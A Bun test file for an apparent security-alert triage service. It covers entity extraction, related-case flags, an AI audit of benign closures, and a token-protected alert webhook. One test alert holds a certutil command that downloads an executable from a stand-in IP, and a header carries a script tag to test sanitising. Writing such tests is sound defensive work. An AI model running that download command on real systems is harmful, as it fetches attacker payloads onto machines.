// Hot, warm and cold loops over HTTP: related cases, retro-flags, the AI audit, timings, and the alert webhook.
import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { loadConfig, type Config } from "../server/src/config";
import { auditReason, entitiesFrom, loopSettings, setLoopSettings, type LoopSettings } from "../server/src/loops";
import type { ProviderResponse, Services } from "../server/src/platform";
import { startApp, type App } from "../server/src/server";
import { createServices } from "../server/src/services";
import { standInServices } from "./helpers";

const TOKEN = "t".repeat(32);
const dirs: string[] = [];
const originalFetch = globalThis.fetch;
let app: App; let base: string; let config: Config; let savedSettings: LoopSettings;

// Jev stand-in: alerts containing "certutil" read as attacker activity; everything else closes as benign.
const alertOf = (state: string): string => { try { const v = JSON.parse(state) as { state?: { alert?: unknown } }; return typeof v.state?.alert === "string" ? v.state.alert : ""; } catch { return ""; } };
const evidence = standInServices("reads_evidence"); const reputation = standInServices("reputation_only");
const jevStates: string[] = [];
let auditAnswer: { verdict: string; summary: string; rationale: string } | null = null;
const services = (c: Config): Services => ({
  ...createServices(c),
  virustotalLookup: evidence.virustotalLookup, shodanEntity: evidence.shodanEntity, abuseIpdbLookup: evidence.abuseIpdbLookup,
  async jevEvaluate(a) { jevStates.push(a.state); return (alertOf(a.state).includes("certutil") ? evidence : reputation).jevEvaluate(a); },
  async aiComplete({ mode }): Promise<ProviderResponse> { return mode === "audit" && auditAnswer ? { ok: true, dataJson: JSON.stringify(auditAnswer), error: null, durationMs: 1 } : { ok: false, dataJson: null, error: "not configured", durationMs: 1 }; },
});

beforeAll(async () => {
  savedSettings = loopSettings();
  globalThis.fetch = (async () => new Response("{}", { status: 404 })) as unknown as typeof fetch;
  const dir = mkdtempSync(join(tmpdir(), "jev-loops-")); dirs.push(dir);
  const b = loadConfig();
  config = { ...b, host: "127.0.0.1", port: 0, dataDir: dir, databasePath: join(dir, "t.db"), uploadDir: join(dir, "up"), memoryDir: join(dir, "memory"), ingestToken: TOKEN, ai: { ...b.ai, mode: "off" }, auth: { user: undefined, password: undefined, allowNoAuth: false }, loops: { relatedWindowDays: 14, audit: { enabled: true, samplePercent: 0, dailyMax: 50 } } };
  app = await startApp(config, { services: services(config), log: () => undefined, pollMs: 15 });
  base = `http://127.0.0.1:${app.server.port}`;
});
afterAll(async () => { await app.stop(); setLoopSettings(savedSettings); globalThis.fetch = originalFetch; for (const d of dirs) rmSync(d, { recursive: true, force: true }); });

const api = async (action: string, body: unknown) => (await (await originalFetch(`${base}/api/${action}`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) })).json()) as Record<string, any>;
async function until<T>(get: () => Promise<T>, ok: (v: T) => boolean): Promise<T> { for (let i = 0; i < 300; i += 1) { const v = await get(); if (ok(v)) return v; await Bun.sleep(20); } throw new Error("timed out"); }
async function run(alert: string): Promise<{ id: string; result: any }> {
  const { id } = await api("createCase", { alertText: alert }); await api("runCase", { id });
  const c = await until(() => api("getCase", { id }), (r) => r.case?.status === "completed");
  await app.worker.drain();
  return { id, result: JSON.parse(c.case.resultJson) };
}
const alert = (host: string, user: string, command: string) => `EDR alert: process activity\nHost: ${host}\nUser: CORP\\${user}\nCommand: ${command}`;

describe("entities", () => {
  test("normalised; generic accounts, loopback and common domains left out", () => {
    const e = entitiesFrom({ users: ["CORP\\M.Jones", "SYSTEM", "root", "WS-HR-11$"], hosts: ["WS-HR-11.corp.example"], ips: ["127.0.0.1", "45.9.1.2"], domains: ["login.microsoftonline.com", "evil.top"], hashes: ["ABCD1234"], commands: [], title: "" });
    expect(e.map((x) => `${x.kind} ${x.value}`)).toEqual(["account m.jones", "host ws-hr-11", "ip 45.9.1.2", "domain evil.top", "hash abcd1234"]);
  });
});

describe("hot loop", () => {
  test("timed, entities indexed, and no related cases on a first alert", async () => {
    const { result } = await run(alert("WS-HOT-01", "a.hot", "whoami"));
    expect(result.verdict).toBe("benign");
    expect(result.timings.hotMs).toBeGreaterThanOrEqual(0);
    expect(result.relatedCases).toBeUndefined();
    expect(jevStates.some((s) => s.includes("relatedCases"))).toBe(false);
  });
});

describe("warm loop: related cases and retro-flags", () => {
  test("confirming a case malicious flags earlier benign closures and blocks new ones", async () => {
    const earlier = await run(alert("WS-HR-11", "m.jones", "whoami /groups"));
    expect(earlier.result.verdict).toBe("benign");
    const incident = await run(alert("WS-HR-11", "m.jones", "net user m.jones"));
    const decided = await api("setDisposition", { caseId: incident.id, label: "malicious", reason: "Account takeover confirmed by IR." });
    expect(decided).toMatchObject({ ok: true, flagged: 1 });

    const flagged = await api("getCase", { id: earlier.id });
    expect(flagged.case.openFlags).toBe(1);
    expect(flagged.flags[0]).toMatchObject({ kind: "related_confirmed_malicious", relatedCaseId: incident.id });
    expect(flagged.flags[0].detail).toContain("host ws-hr-11");
    const list = await api("listCases", { limit: 50 });
    expect(list.cases.find((c: any) => c.id === earlier.id).openFlags).toBe(1);

    // A new alert on the same host: Jev sees the confirmed case, and a benign close is blocked until an analyst looks.
    jevStates.length = 0;
    const next = await run(alert("WS-HR-11", "someone.else", "ipconfig /all"));
    expect(next.result.relatedCases[0]).toMatchObject({ caseId: incident.id, outcome: "analyst_malicious", reason: "Account takeover confirmed by IR.", shared: ["host ws-hr-11"] });
    expect(jevStates.some((s) => s.includes("relatedCases") && s.includes("an analyst confirmed it malicious"))).toBe(true);
    expect(next.result.verdict).toBe("needs_human");
    expect(next.result.guardrail.conflicts.join(" ")).toContain("confirmed malicious");

    // Deciding the flagged case clears its flag.
    await api("setDisposition", { caseId: earlier.id, label: "benign", reason: "Unrelated helpdesk check." });
    expect((await api("getCase", { id: earlier.id })).case.openFlags).toBe(0);
  });

  test("the agent's own benign closures are never shown as related context", async () => {
    await run(alert("WS-QUIET-02", "b.quiet", "whoami"));
    jevStates.length = 0;
    const second = await run(alert("WS-QUIET-02", "b.quiet", "hostname"));
    expect(second.result.relatedCases).toBeUndefined();
    expect(jevStates.some((s) => s.includes("relatedCases"))).toBe(false);
  });

  test("a case the agent calls malicious flags related closures; an analyst's benign call withdraws the flag", async () => {
    const closure = await run(alert("WS-DEV-05", "c.dev", "whoami"));
    const attack = await run(alert("WS-DEV-05", "c.dev", "certutil.exe -urlcache -split -f http://45.9.1.2/p.exe C:\\Users\\Public\\p.exe"));
    expect(attack.result.verdict).toBe("malicious");
    const flagged = await until(() => api("getCase", { id: closure.id }), (r) => r.flags.length > 0);
    expect(flagged.flags[0]).toMatchObject({ kind: "related_agent_malicious", relatedCaseId: attack.id });
    await api("setDisposition", { caseId: attack.id, label: "benign", reason: "Admin test download." });
    const after = await api("getCase", { id: closure.id });
    expect(after.case.openFlags).toBe(0);
    expect(after.flags[0].resolvedBy).toContain("marked the related case benign");
  });
});

describe("warm loop: AI audit of benign closures", () => {
  test("which closures are audited", () => {
    const b = { verdict: "benign", decidedBy: "jev", pMalicious: 0.02, behaviors: [] as Array<{ statement: string; strength: string }> };
    expect(auditReason({ ...b, verdict: "malicious" }, 100)).toBeNull();
    expect(auditReason({ ...b, pMalicious: 0.12 }, 0)).toContain("close to the benign threshold");
    expect(auditReason({ ...b, behaviors: [{ statement: "Encoded PowerShell", strength: "moderate" }] }, 0)).toContain("suspicious behaviour");
    expect(auditReason(b, 0)).toBeNull();
    expect(auditReason(b, 5, () => 0.01)).toBe("random sample of benign closures");
  });

  test("a disagreement flags the case for an analyst; the verdict stays Jev's", async () => {
    setLoopSettings({ ...config.loops, audit: { enabled: true, samplePercent: 100, dailyMax: 50 } });
    auditAnswer = { verdict: "needs_human", summary: "- The binary is unsigned and unknown to VirusTotal.\n- Closing without a person was unsafe.", rationale: "unknown binary in a user folder" };
    try {
      const { id } = await run(alert("WS-AUD-09", "d.audit", "whoami"));
      const c = await until(() => api("getCase", { id }), (r) => JSON.parse(r.case.resultJson).audit?.status === "disagrees");
      const result = JSON.parse(c.case.resultJson);
      expect(result.verdict).toBe("benign");
      expect(result.audit).toMatchObject({ status: "disagrees", verdict: "needs_human", reason: "random sample of benign closures" });
      expect(c.flags[0]).toMatchObject({ kind: "claude_disagrees" });
      expect(c.flags[0].detail).toContain("unknown binary in a user folder");

      auditAnswer = { verdict: "benign", summary: "- Routine identity check by the user on their own workstation.", rationale: "routine" };
      const ok = await run(alert("WS-AUD-10", "e.audit", "whoami"));
      const agreed = await until(() => api("getCase", { id: ok.id }), (r) => JSON.parse(r.case.resultJson).audit?.status === "agrees");
      expect(agreed.flags).toEqual([]);
    } finally { setLoopSettings(config.loops); auditAnswer = null; }
  });

  test("the daily cap is respected", async () => {
    setLoopSettings({ ...config.loops, audit: { enabled: true, samplePercent: 100, dailyMax: 0 } });
    try {
      const { result } = await run(alert("WS-CAP-01", "f.cap", "whoami"));
      await app.worker.drain();
      const c = await api("getCase", { id: (await api("listCases", { limit: 1 })).cases[0].id });
      expect(JSON.parse(c.case.resultJson).audit).toBeUndefined();
      expect(result.verdict).toBe("benign");
    } finally { setLoopSettings(config.loops); }
  });
});

describe("alert webhook", () => {
  const post = (body: string, headers: Record<string, string> = {}) => originalFetch(`${base}/ingest/alert`, { method: "POST", headers: { "Content-Type": "application/json", ...headers }, body });
  test("needs the token", async () => {
    expect((await post("{}")).status).toBe(401);
    expect((await post("{}", { Authorization: `Bearer ${"x".repeat(32)}` })).status).toBe(401);
  });
  test("an alert that arrives is triaged at once; a resend returns the same case", async () => {
    const body = JSON.stringify({ rule_name: "Suspicious whoami", device: { hostname: "WS-HOOK-01" }, user: "CORP\\g.hook", process: { command_line: "whoami /priv" } });
    const res = await post(body, { Authorization: `Bearer ${TOKEN}`, "X-Alert-Source": "Vision One <script>" });
    expect(res.status).toBe(202);
    const { id, duplicate } = await res.json() as { id: string; duplicate: boolean };
    expect(duplicate).toBe(false);
    const c = await until(() => api("getCase", { id }), (r) => r.case?.status === "completed");
    expect(c.case.title).toBe("Suspicious whoami");
    expect(c.case.sourceName).toBe("webhook: Vision One script");
    const again = await post(body, { Authorization: `Bearer ${TOKEN}` });
    expect(again.status).toBe(200);
    expect(await again.json()).toEqual({ ok: true, id, duplicate: true });
    const keyed = await post(JSON.stringify({ rule_name: "changed text" }), { Authorization: `Bearer ${TOKEN}`, "Idempotency-Key": "WB-123" });
    const keyedAgain = await post(JSON.stringify({ rule_name: "changed text, updated" }), { Authorization: `Bearer ${TOKEN}`, "Idempotency-Key": "WB-123" });
    expect(((await keyedAgain.json()) as { id: string }).id).toBe(((await keyed.json()) as { id: string }).id);
    await app.worker.drain();
  });
  test("off unless INGEST_TOKEN is set, and weak tokens are refused", async () => {
    const dir = mkdtempSync(join(tmpdir(), "jev-loops-")); dirs.push(dir);
    const off = await startApp({ ...config, port: 0, databasePath: join(dir, "t.db"), ingestToken: undefined }, { services: services(config), log: () => undefined });
    try { expect((await originalFetch(`http://127.0.0.1:${off.server.port}/ingest/alert`, { method: "POST", body: "{}" })).status).toBe(404); } finally { await off.stop(); }
    const saved = process.env.INGEST_TOKEN; process.env.INGEST_TOKEN = "short";
    try { expect(() => loadConfig()).toThrow("at least 24 characters"); } finally { if (saved === undefined) delete process.env.INGEST_TOKEN; else process.env.INGEST_TOKEN = saved; }
  });
});
